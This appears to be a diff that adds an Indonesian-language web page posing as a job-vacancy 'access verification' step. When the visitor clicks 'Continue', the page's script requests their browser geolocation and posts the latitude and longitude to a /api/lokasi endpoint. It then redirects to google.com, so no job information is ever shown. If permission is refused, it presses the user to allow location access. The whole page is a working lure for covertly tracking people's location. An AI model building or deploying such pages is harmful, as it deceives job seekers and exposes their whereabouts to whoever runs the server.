@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informasi Lowongan Kerja Terbaru</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: inline-block; }
+        button { background: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Verifikasi Akses Lowongan Kerja</h2>
+        <p>Silakan klik tombol di bawah untuk melanjutkan ke halaman informasi.</p>
+        <button onclick="getLocation()">Lanjutkan</button>
+    </div>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        }
+        function sendPosition(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+            fetch('/api/lokasi', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+        function showError(error) {
+            alert("Mohon izinkan akses lokasi untuk melanjutkan verifikasi.");
+        }
+    </script>
+</body>
+</html>
